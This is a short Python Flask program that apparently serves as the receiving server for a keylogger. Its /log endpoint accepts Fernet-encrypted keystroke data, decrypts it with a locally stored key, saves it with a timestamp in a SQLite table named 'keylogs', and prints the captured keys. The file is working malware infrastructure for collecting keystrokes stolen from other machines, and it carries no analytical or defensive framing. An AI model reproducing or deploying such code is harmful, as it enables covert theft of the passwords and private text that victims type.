from flask import Flask, request
from cryptography.fernet import Fernet
from datetime import datetime
import sqlite3

app = Flask(__name__)

# Load encryption key
with open("secret.key", "rb") as f:
    cipher = Fernet(f.read())

# Setup SQLite
conn = sqlite3.connect("keylogs.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
CREATE TABLE IF NOT EXISTS keylogs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT,
    keys TEXT
)
''')

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    encrypted = data.get("data", "").encode()

    try:
        decrypted = cipher.decrypt(encrypted).decode()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute("INSERT INTO keylogs (timestamp, keys) VALUES (?, ?)", (timestamp, decrypted))
        conn.commit()
        print(f"{timestamp} - Logged keys: {decrypted}")
        return "OK", 200
    except Exception as e:
        print(f"Decryption error: {e}")
        return "Failed", 400

app.run(port=5000)
